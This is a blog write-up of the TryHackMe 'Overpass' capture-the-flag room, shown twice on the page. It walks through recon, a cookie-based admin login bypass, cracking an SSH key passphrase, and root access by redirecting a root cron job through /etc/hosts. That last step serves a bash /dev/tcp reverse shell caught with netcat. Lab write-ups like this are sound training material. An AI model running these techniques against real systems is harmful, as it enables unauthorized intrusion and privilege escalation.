<!DOCTYPE html>
<html lang="en">
  <head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="description" content="This is my personal website. The purpose of the Website is to assist and monitor my own development.">
<meta name="google-site-verification" content="NeMnHGyDeeJqt9s_pg03TI1foYUOvLwrHreqLj_mgRE">
<meta name="language" content="en">

<!-- Twitter And Open Graph Meta -->
<!-- Open Graph Meta Tags -->
<meta property="og:title" content="Tryhackme - Overpass">
<meta property="og:type" content="Article">
<meta property="og:url" content="http://localhost:4000/tryhackme-overpass/">
<meta name="image" property="og:image" content="/assets/img/avatar.jpg">
<meta property="og:image:alt" content="">
<meta property="og:site_name" content="Mr0Wido's Blog">
<meta property="og:locale" content="en_US">

<!-- Twitter Meta Tags -->
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:site" content="@">
<meta name="twitter:title" content="Tryhackme - Overpass">
<meta name="twitter:image" content="/assets/img/avatar.jpg">



<!-- css -->
<link rel="shortcut icon" href="/assets/img/favicon.ico" type="ico">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
<link rel="canonical" href="/tryhackme-overpass/">
<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>



<title>Tryhackme - Overpass - Mr0Wido's Blog</title>



<!-- Script -->
<script src="https://unpkg.com/simple-jekyll-search@latest/dest/simple-jekyll-search.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>
<script src="https://kit.fontawesome.com/d54796acd1.js" crossorigin="anonymous"></script>





    <title>Tryhackme - Overpass - Mr0Wido's Blog</title>
    <link rel="stylesheet" type="text/css" href="/assets/css/main.css">
  </head>
  <body>
    <header class="site-header">
  <a class="site-logo" href="/"> <img src="/assets/img/icon-4.png" alt="logo"></a>
  <div class="site-title">
    <a href="http://localhost:4000">Mr0Wido's Blog</a>
  </div>
  <nav class="site-nav">
    <ul class="site-nav__list">
      <li class="site-nav__item">
        <a class="site-nav__link " href="/">Home</a>
      </li>
      <li class="site-nav__item">
        <a class="site-nav__link " href="/whoami/">Whoami</a>
      </li>
      <li class="site-nav__item">
        <a class="site-nav__link " href="/posts/">Posts</a>
      </li>
      <li class="site-nav__item">
        <a class="site-nav__link " href="/projects/">Projects</a>
      </li>
      <li class="site-nav__item">
        <a class="site-nav__link " href="/cv/">CV</a>
      </li>
      <li class="site-nav__item">
        <a class="site-nav__link " href="/categories/">Categories</a>
      </li>
      <li class="site-nav__item">
        <div class="search">
          <input type="text" id="search-input" placeholder="Search...">
          <i class="fas fa-search"></i>
          <ul id="results-container"></ul>
        </div>
      </li>
    </ul>
  </nav>
</header>


<!-- 360 to 980 -->
<header class="header-mobile">
  <div class="header-inner clearfix">
    <div class="nav-btn nav-slider">
      <i class="fa-solid fa-bars"></i>
    </div>
    <a class="site-logo" href="/"> <img src="/assets/img/icon-4.png" alt="logo"></a>
    <div class="site-title">
      <a href="http://localhost:4000">Mr0Wido's Blog</a>
    </div>
  </div>
</header>
<nav class="sidebar">
  <div class="nav-header">
    <div class="nav-search">
      <div class="search">
        <i class="fas fa-search"></i>
        <input type="search" name="search" id="search-input" placeholder="Search...">
        <ul id="results-container"></ul>
      </div>
    </div>
  </div>
  <ul class="nav-categories ul-base">
    <li><a class="site-nav__link " href="/">Home</a></li>
    <li><a class="site-nav__link " href="/whoami/">Whoami</a></li>
    <li><a class="site-nav__link " href="/posts/">Posts</a></li>
    <li><a class="site-nav__link " href="/projects/">Projects</a></li>
    <li><a class="site-nav__link " href="/cv/">CV</a></li>
    <li><a class="site-nav__link " href="/categories/">Categories</a></li>
  </ul>
  <ul class="social ul-base">
    <li><a href="https://twitter.com/" itemprop="sameAs" rel="nofollow noopener noreferrer me" target="_blank"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i></a></li>
    <li><a href="https://instagram.com/" itemprop="sameAs" rel="nofollow noopener noreferrer me" target="_blank"><i class="fab fa-fw fa-instagram" aria-hidden="true"></i></a></li>
    <li><a href="https://www.linkedin.com/in/" itemprop="sameAs" rel="nofollow noopener noreferrer me" target="_blank"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i></a></li>
    <li><a href="https://github.com/" itemprop="sameAs" rel="nofollow noopener noreferrer me" target="_blank"><i class="fab fa-fw fa-github" aria-hidden="true"></i></a></li>
  </ul>
  <div class="copyright">
    <span> © Copyright 2024 Mr0Wido's Blog | Powered by Jekyll | <a href="/tos/">Terms of Service</a> | <a href="/disclaimer/">Disclaimer</a></span>
  </div>
</nav>
<div class="overlay"></div>
    
    <div class="container-default">
      <div class="content-container">
        <main class="default">
          <div class="post">
  <h1 class="post__title">Tryhackme - Overpass</h1>
  <div class="post__content">
    <p>Overpass is easy room to get you started in CTF’s.</p>

<h2 id="recon">Recon</h2>
<p>The first thing you will do is scan the target ip address to find open ports. We do it using <strong><code class="language-plaintext highlighter-rouge">Nmap</code></strong>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSV -v 10.8.81.166
</code></pre></div></div>
<p><img src="/assets/img/tryhackme/overpass/nmap.png" alt="nmap"></p>

<p>As we see here, 2 ports are open. One is <strong><code class="language-plaintext highlighter-rouge">HTTP:80</code></strong> and the other is <strong><code class="language-plaintext highlighter-rouge">SSH:22</code></strong>. We can make a few guesses based on this. I think we should somehow find the necessary information for ssh connection from this site. And we have to get into the target machine using ssh. But this is just a guess for now.
Anyway, let’s go to the website first and see what’s up.</p>

<p><img src="/assets/img/tryhackme/overpass/homepage.png" alt="homepage"></p>

<p>Overpass is a password manager. We saw 2 more pages on the main page, one “About Us” and the other “Downloads”. Let’s examine both.</p>

<h3 id="about-us">About Us</h3>
<p><img src="/assets/img/tryhackme/overpass/aboutus.png" alt="aboutus"></p>

<p>Here we see a few names that may be useful to us in the future.</p>

<h3 id="download">Download</h3>
<p><img src="/assets/img/tryhackme/overpass/download.png" alt="download"></p>

<p>We see two files here, one is the source code of overpass and the other is the script that runs this code.
We couldn’t find much, let’s look at the source codes of the pages.</p>

<p><img src="/assets/img/tryhackme/overpass/home_source.png" alt="home"></p>

<p>This is really fun.
We couldn’t find anything remarkable in the source code of the About Us and Downloads pages.</p>

<p>Let’s do a gobuster scan to see if there are other pages on the site.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gobuster dir -u 10.10.79.124 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/overpass/gobuster.png" alt="aboutus"></p>

<p>We found an interesting place <strong><code class="language-plaintext highlighter-rouge">/admin/</code></strong> page here, let’s examine it.
I tried a few login attempts first, but it didn’t work.</p>

<p><img src="/assets/img/tryhackme/overpass/admin.png" alt="aboutus"></p>

<p>Let’s take a look at the source code of the admin page.
Maybe we can brute force using the information here.</p>

<p><img src="/assets/img/tryhackme/overpass/admin_id.png" alt="aboutus"></p>

<p>And there are several javascript files, let’s examine them.</p>

<p><img src="/assets/img/tryhackme/overpass/admin_file.png" alt="aboutus"></p>

<p>The <strong><code class="language-plaintext highlighter-rouge">main.js</code></strong> contains nothing but the hello world output.</p>

<p><img src="/assets/img/tryhackme/overpass/main.png" alt="aboutus"></p>

<p>Let’s examine <strong><code class="language-plaintext highlighter-rouge">login.js</code></strong> now.</p>

<p><img src="/assets/img/tryhackme/overpass/login.png" alt="aboutus"></p>

<p>We found something here. A login function has been placed here. It says that if you enter wrong information, you will get incorrect credentials, but if it is entered correctly, cookie settings will be set as <strong><code class="language-plaintext highlighter-rouge">SessionToken and status0Cookie</code></strong>. Let’s try to login using this cookie information.</p>

<p><img src="/assets/img/tryhackme/overpass/settings.png" alt="aboutus"></p>

<p>After entering the information, we refresh the page and we are inside.
We come across an <strong><code class="language-plaintext highlighter-rouge">SSH key</code></strong>, but there is an article before it.</p>

<p><img src="/assets/img/tryhackme/overpass/admin_on.png" alt="aboutus"></p>

<p>Paradox was annoyed that James kept forgetting the password. And as punishment, he wrote the password as SSH Key.</p>

<p><img src="/assets/img/tryhackme/overpass/ssh.png" alt="aboutus"></p>

<p>Let’s find james’ SSH password.
To crack the password of an rsa key, we need to follow these steps.
We create <strong><code class="language-plaintext highlighter-rouge">id_rsa file using nano</code></strong>. Copy and paste the rsa private key information into it. Then we change the permission settings using <strong><code class="language-plaintext highlighter-rouge">chmod</code></strong> so that ssh can use it.
Then we use <strong><code class="language-plaintext highlighter-rouge">ssh2john</code></strong> to bring this ssh key in a way that joh can crack, and then we find the password using <strong><code class="language-plaintext highlighter-rouge">john</code></strong>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nano id_rsa
$ chmod 600 id_rsa
$ ssh2john id_rsa &gt; hash.txt
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
</code></pre></div></div>

<p>And we find the password <strong><code class="language-plaintext highlighter-rouge">j****13</code></strong>
Now we can connect to james using this information.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ssh -i id_rsa james@10.10.79.124
</code></pre></div></div>

<p>And we’re inside</p>

<p><img src="/assets/img/tryhackme/overpass/james.png" alt="aboutus"></p>

<p>Let’s see what’s in james’ folder.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ls -la
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/overpass/ls.png" alt="aboutus"></p>

<p>There are a few files that caught our attention <strong><code class="language-plaintext highlighter-rouge">todo.txt, user.txt</code></strong>
<strong><code class="language-plaintext highlighter-rouge">user.txt : user flag</code></strong></p>

<p><img src="/assets/img/tryhackme/overpass/user_flag.png" alt="aboutus"></p>

<p>Now let’s take a look at <strong><code class="language-plaintext highlighter-rouge">todo.txt</code></strong>.</p>

<p><img src="/assets/img/tryhackme/overpass/todo.png" alt="aboutus"></p>

<p>Important things are being talked about here. James keeps a password around here, but he said he used his own password manager.
There was something he wanted to talk to Pardox about. He also says how the build script works automatically in the system.</p>

<p>I examined the files again using <strong><code class="language-plaintext highlighter-rouge">ls -la</code></strong> and there is another file called .overpass, and when I looked inside, I found something like this.</p>

<p><img src="/assets/img/tryhackme/overpass/pass.png" alt="aboutus"></p>

<p>This must be the password that James mentioned in todo.txt, but we don’t know how he encrypted it. But he told us they did it using their own password manager. So why don’t we go back to the website and examine the source code of the overpass?
What I noticed when I reviewed the code is this.</p>

<p><img src="/assets/img/tryhackme/overpass/source.png" alt="aboutus"></p>

<p>The algorithm they use according to the code they wrote is <strong><code class="language-plaintext highlighter-rouge">rotate-47</code></strong></p>

<p><img src="/assets/img/tryhackme/overpass/rot.png" alt="aboutus"></p>

<p>And here we found a password but I didn’t understand where to put it.</p>

<p>But if we need to go back to todo.txt, James was talking about the continuous and automatic loading of the application there, why don’t we look at the cronjob.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cat /etc/crontab
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/overpass/cron.png" alt="aboutus"></p>

<p>And here we get important information. As we can see, the root user automatically runs the file <code class="language-plaintext highlighter-rouge">overpass.thm/downloads/src/buildscript.sh</code> as <strong><code class="language-plaintext highlighter-rouge">cronjob</code></strong>.
In other words, a bash file is running automatically in the system, if we can change this file, we can place our own reverse shell.
I tried to open and change the file several times, but I couldn’t do anything because it exceeded my authorization limits. But there was one thing I missed, overpass.thm is a hostname and if we manage to change this hostname and enter our own machine information, I can run my own buildscript.sh file.
For this I first check the contents of  <strong><code class="language-plaintext highlighter-rouge">/etc/hosts</code></strong>.</p>

<p><img src="/assets/img/tryhackme/overpass/hosts.png" alt="aboutus"></p>

<p>Interestingly, James has the ability to modify this file.
Using my own machine ip, I change the overpass.thm line to<strong><code class="language-plaintext highlighter-rouge">"10.8.81.166 overpass.thm"</code></strong>
Then I will do the following in order on my own machine. I will create the /downloads/src/buildscript.sh file. And I will write revershell inside this file, then I will open an http.server just outside the downloads folder. At the same time, I will open a listener for nc using the same port as the port I entered in revershell. Then cronjab will connect to my machine and get the downoads/src/buildscript.sh file and then run it. The revershell inside it will also work and boom we’ll go inside.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ bash -i &gt;&amp; /dev/tcp/10.8.81.166/4444 &gt;&amp;1
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ mkdir downloads
$ cd downloads
$ mdir src
$ cd src
$ nano buildscript.sh
$ cd ../..
$ python3 -m http.server 80
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc -nlvp 4444
</code></pre></div></div>
<p>We are inside.</p>

<p><img src="/assets/img/tryhackme/overpass/root.png" alt="aboutus"></p>

<p>And root flag .</p>

<p><img src="/assets/img/tryhackme/overpass/root_flag.png" alt="aboutus"></p>

<p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>

  </div>
  <div class="post__footer">
    <p class="post__date">
      <i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i>  Mar 01, 2023</p>
    <div class="post__categories">
      
      
      <p><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: <a href="/categories/#TryHackMe">TryHackMe</a></p>
            
    </div>      
    
    <div class="post__tags">
      <p class="post__tags-title">
        <span class="post__tags__title"><i class="fas fa-fw fa-tags" aria-hidden="true"></i>Tags: </span>
        <span class="post__tags-container">
          
          <span class="post__tags-item">security,</span>
          
          <span class="post__tags-item">easy,</span>
          
          <span class="post__tags-item">cron,</span>
          
          <span class="post__tags-item">owasp top 10</span>
          
        </span>
      </p>
    </div>
    
  </div>
</div>
<br>
<!-- Twitter Share Button -->
<a href="https://twitter.com/intent/tweet?text=Tryhackme%20-%20Overpass&amp;url=http://localhost:4000/tryhackme-overpass/&amp;via=Mr0Wido" target="_blank" rel="noopener noreferrer" class="share-btn tweet-btn" title="Share on Twitter">
    Tweet
</a>
  
<!-- LinkedIn Share Button -->
<a href="https://www.linkedin.com/sharing/share-offsite/?url=http://localhost:4000/tryhackme-overpass/" target="_blank" rel="noopener noreferrer" class="share-btn" title="Share on LinkedIn">
    LinkedIn
</a>
  
  

<br>


<div id="disqus_thread"></div>
<script>
    var disqus_config = function () {
    this.page.url = 'http://localhost:4000/tryhackme-overpass/';
    this.page.identifier = '/tryhackme-overpass';
    
    };

    (function() { // DON'T EDIT BELOW THIS LINE
    var d = document, s = d.createElement('script');
    s.src = 'https://mr0widos-blog.disqus.com/embed.js';
    s.setAttribute('data-timestamp', +new Date());
    (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="external nofollow noopener" target="_blank">comments powered by Disqus.</a>
</noscript>



        </main>
      </div>
      <div class="author-container">
        


<div itemscope itemtype="https://schema.org/Person" class="author-card">

  
    <div class="author__avatar">
        <img src="/assets/img/avatar.jpg" alt="Mr0Wido's Blog" itemprop="image" class="u-photo">
    </div>
  
  <div class="author__content-head">
    <div class="author__content">
      <h3 class="author__name p-name" itemprop="name">
        <a class="u-url" rel="me" href="http://localhost:4000/" itemprop="url">Mr0Wido's Blog</a>
      </h3>
      
        <div class="author__bio p-note" itemprop="description">
          <p>I am passionate about all things technology-related. My thirst for knowledge knows no bounds, and I consider myself a lifelong learner.</p>

        </div>
      
    </div>
  
    <div class="author__urls-wrapper">
      <ul class="author__urls social-icons">
        
          
            
              <li><a href="https://mr0wido.github.io" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">Website</span></a></li>
            
          
            
              <li><a href="https://twitter.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
            
          
            
              <li><a href="https://github.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
            
          
            
              <li><a href="https://www.instagram.com/furkn.dniz/" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-instagram" aria-hidden="true"></i><span class="label">Instagram</span></a></li>
            
          
            
              <li><a href="https://www.linkedin.com/in/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
            
          
        
  
        
  
        
          <li>
            <a href="mailto:mr0wido@protonmail.com" rel="me" class="u-email">
              <meta itemprop="email" content="mr0wido@protonmail.com">
              <i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span>
            </a>
          </li>
        
  
        
  
        
  
        
  
        
  
        
  
        
  
        
  
        <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer me">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
      </ul>
    </div>
  </div>
  <div class="author__content-head-medium">
    <div class="author__content">
      <h3 class="author__name p-name" itemprop="name">
        <a class="u-url" rel="me" href="http://localhost:4000/" itemprop="url">Mr0Wido's Blog</a>
      </h3>
      
        <div class="author__bio p-note" itemprop="description">
          <p>I am passionate about all things technology-related. My thirst for knowledge knows no bounds, and I consider myself a lifelong learner.</p>

        </div>
      
      <div class="author__urls-wrapper">
        <ul class="author__urls social-icons">
          
            
              
                <li><a href="https://mr0wido.github.io" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">Website</span></a></li>
              
            
              
                <li><a href="https://twitter.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
              
            
              
                <li><a href="https://github.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
              
            
              
                <li><a href="https://www.instagram.com/furkn.dniz/" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-instagram" aria-hidden="true"></i><span class="label">Instagram</span></a></li>
              
            
              
                <li><a href="https://www.linkedin.com/in/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
              
            
          
    
          
    
          
            <li>
              <a href="mailto:mr0wido@protonmail.com" rel="me" class="u-email">
                <meta itemprop="email" content="mr0wido@protonmail.com">
                <i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span>
              </a>
            </li>
          
    
          
    
          
    
          
    
          
    
          
    
          
    
          
    
          <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer me">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
        </ul>
      </div>
    </div>
  

  </div>
</div>

      </div>
    </div>

    <div class="container-medium">
      <div class="author-container">
        


<div itemscope itemtype="https://schema.org/Person" class="author-card">

  
    <div class="author__avatar">
        <img src="/assets/img/avatar.jpg" alt="Mr0Wido's Blog" itemprop="image" class="u-photo">
    </div>
  
  <div class="author__content-head">
    <div class="author__content">
      <h3 class="author__name p-name" itemprop="name">
        <a class="u-url" rel="me" href="http://localhost:4000/" itemprop="url">Mr0Wido's Blog</a>
      </h3>
      
        <div class="author__bio p-note" itemprop="description">
          <p>I am passionate about all things technology-related. My thirst for knowledge knows no bounds, and I consider myself a lifelong learner.</p>

        </div>
      
    </div>
  
    <div class="author__urls-wrapper">
      <ul class="author__urls social-icons">
        
          
            
              <li><a href="https://mr0wido.github.io" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">Website</span></a></li>
            
          
            
              <li><a href="https://twitter.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
            
          
            
              <li><a href="https://github.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
            
          
            
              <li><a href="https://www.instagram.com/furkn.dniz/" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-instagram" aria-hidden="true"></i><span class="label">Instagram</span></a></li>
            
          
            
              <li><a href="https://www.linkedin.com/in/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
            
          
        
  
        
  
        
          <li>
            <a href="mailto:mr0wido@protonmail.com" rel="me" class="u-email">
              <meta itemprop="email" content="mr0wido@protonmail.com">
              <i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span>
            </a>
          </li>
        
  
        
  
        
  
        
  
        
  
        
  
        
  
        
  
        <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer me">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
      </ul>
    </div>
  </div>
  <div class="author__content-head-medium">
    <div class="author__content">
      <h3 class="author__name p-name" itemprop="name">
        <a class="u-url" rel="me" href="http://localhost:4000/" itemprop="url">Mr0Wido's Blog</a>
      </h3>
      
        <div class="author__bio p-note" itemprop="description">
          <p>I am passionate about all things technology-related. My thirst for knowledge knows no bounds, and I consider myself a lifelong learner.</p>

        </div>
      
      <div class="author__urls-wrapper">
        <ul class="author__urls social-icons">
          
            
              
                <li><a href="https://mr0wido.github.io" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">Website</span></a></li>
              
            
              
                <li><a href="https://twitter.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
              
            
              
                <li><a href="https://github.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
              
            
              
                <li><a href="https://www.instagram.com/furkn.dniz/" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-instagram" aria-hidden="true"></i><span class="label">Instagram</span></a></li>
              
            
              
                <li><a href="https://www.linkedin.com/in/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
              
            
          
    
          
    
          
            <li>
              <a href="mailto:mr0wido@protonmail.com" rel="me" class="u-email">
                <meta itemprop="email" content="mr0wido@protonmail.com">
                <i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span>
              </a>
            </li>
          
    
          
    
          
    
          
    
          
    
          
    
          
    
          
    
          <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer me">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
        </ul>
      </div>
    </div>
  

  </div>
</div>

      </div>
      <div class="content-container">
        <main class="default">
          <div class="post">
  <h1 class="post__title">Tryhackme - Overpass</h1>
  <div class="post__content">
    <p>Overpass is easy room to get you started in CTF’s.</p>

<h2 id="recon">Recon</h2>
<p>The first thing you will do is scan the target ip address to find open ports. We do it using <strong><code class="language-plaintext highlighter-rouge">Nmap</code></strong>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSV -v 10.8.81.166
</code></pre></div></div>
<p><img src="/assets/img/tryhackme/overpass/nmap.png" alt="nmap"></p>

<p>As we see here, 2 ports are open. One is <strong><code class="language-plaintext highlighter-rouge">HTTP:80</code></strong> and the other is <strong><code class="language-plaintext highlighter-rouge">SSH:22</code></strong>. We can make a few guesses based on this. I think we should somehow find the necessary information for ssh connection from this site. And we have to get into the target machine using ssh. But this is just a guess for now.
Anyway, let’s go to the website first and see what’s up.</p>

<p><img src="/assets/img/tryhackme/overpass/homepage.png" alt="homepage"></p>

<p>Overpass is a password manager. We saw 2 more pages on the main page, one “About Us” and the other “Downloads”. Let’s examine both.</p>

<h3 id="about-us">About Us</h3>
<p><img src="/assets/img/tryhackme/overpass/aboutus.png" alt="aboutus"></p>

<p>Here we see a few names that may be useful to us in the future.</p>

<h3 id="download">Download</h3>
<p><img src="/assets/img/tryhackme/overpass/download.png" alt="download"></p>

<p>We see two files here, one is the source code of overpass and the other is the script that runs this code.
We couldn’t find much, let’s look at the source codes of the pages.</p>

<p><img src="/assets/img/tryhackme/overpass/home_source.png" alt="home"></p>

<p>This is really fun.
We couldn’t find anything remarkable in the source code of the About Us and Downloads pages.</p>

<p>Let’s do a gobuster scan to see if there are other pages on the site.</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gobuster dir -u 10.10.79.124 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/overpass/gobuster.png" alt="aboutus"></p>

<p>We found an interesting place <strong><code class="language-plaintext highlighter-rouge">/admin/</code></strong> page here, let’s examine it.
I tried a few login attempts first, but it didn’t work.</p>

<p><img src="/assets/img/tryhackme/overpass/admin.png" alt="aboutus"></p>

<p>Let’s take a look at the source code of the admin page.
Maybe we can brute force using the information here.</p>

<p><img src="/assets/img/tryhackme/overpass/admin_id.png" alt="aboutus"></p>

<p>And there are several javascript files, let’s examine them.</p>

<p><img src="/assets/img/tryhackme/overpass/admin_file.png" alt="aboutus"></p>

<p>The <strong><code class="language-plaintext highlighter-rouge">main.js</code></strong> contains nothing but the hello world output.</p>

<p><img src="/assets/img/tryhackme/overpass/main.png" alt="aboutus"></p>

<p>Let’s examine <strong><code class="language-plaintext highlighter-rouge">login.js</code></strong> now.</p>

<p><img src="/assets/img/tryhackme/overpass/login.png" alt="aboutus"></p>

<p>We found something here. A login function has been placed here. It says that if you enter wrong information, you will get incorrect credentials, but if it is entered correctly, cookie settings will be set as <strong><code class="language-plaintext highlighter-rouge">SessionToken and status0Cookie</code></strong>. Let’s try to login using this cookie information.</p>

<p><img src="/assets/img/tryhackme/overpass/settings.png" alt="aboutus"></p>

<p>After entering the information, we refresh the page and we are inside.
We come across an <strong><code class="language-plaintext highlighter-rouge">SSH key</code></strong>, but there is an article before it.</p>

<p><img src="/assets/img/tryhackme/overpass/admin_on.png" alt="aboutus"></p>

<p>Paradox was annoyed that James kept forgetting the password. And as punishment, he wrote the password as SSH Key.</p>

<p><img src="/assets/img/tryhackme/overpass/ssh.png" alt="aboutus"></p>

<p>Let’s find james’ SSH password.
To crack the password of an rsa key, we need to follow these steps.
We create <strong><code class="language-plaintext highlighter-rouge">id_rsa file using nano</code></strong>. Copy and paste the rsa private key information into it. Then we change the permission settings using <strong><code class="language-plaintext highlighter-rouge">chmod</code></strong> so that ssh can use it.
Then we use <strong><code class="language-plaintext highlighter-rouge">ssh2john</code></strong> to bring this ssh key in a way that joh can crack, and then we find the password using <strong><code class="language-plaintext highlighter-rouge">john</code></strong>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nano id_rsa
$ chmod 600 id_rsa
$ ssh2john id_rsa &gt; hash.txt
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
</code></pre></div></div>

<p>And we find the password <strong><code class="language-plaintext highlighter-rouge">j****13</code></strong>
Now we can connect to james using this information.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ssh -i id_rsa james@10.10.79.124
</code></pre></div></div>

<p>And we’re inside</p>

<p><img src="/assets/img/tryhackme/overpass/james.png" alt="aboutus"></p>

<p>Let’s see what’s in james’ folder.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ls -la
</code></pre></div></div>

<p><img src="/assets/img/tryhackme/overpass/ls.png" alt="aboutus"></p>

<p>There are a few files that caught our attention <strong><code class="language-plaintext highlighter-rouge">todo.txt, user.txt</code></strong>
<strong><code class="language-plaintext highlighter-rouge">user.txt : user flag</code></strong></p>

<p><img src="/assets/img/tryhackme/overpass/user_flag.png" alt="aboutus"></p>

<p>Now let’s take a look at <strong><code class="language-plaintext highlighter-rouge">todo.txt</code></strong>.</p>

<p><img src="/assets/img/tryhackme/overpass/todo.png" alt="aboutus"></p>

